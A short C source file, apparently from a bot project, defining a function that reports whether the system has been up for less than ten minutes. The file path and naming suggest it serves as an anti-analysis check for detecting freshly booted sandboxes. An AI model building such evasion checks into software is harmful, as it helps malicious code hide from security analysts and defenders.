#include "../../includes/detection/uptime.h"


/*
    *    util/bot/util/detection/uptime.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


bool d_uptime(void) {
    struct sysinfo s_info;
    sysinfo(&s_info);
    if (s_info.uptime < 600) {
        return true;
    }
    return false;
}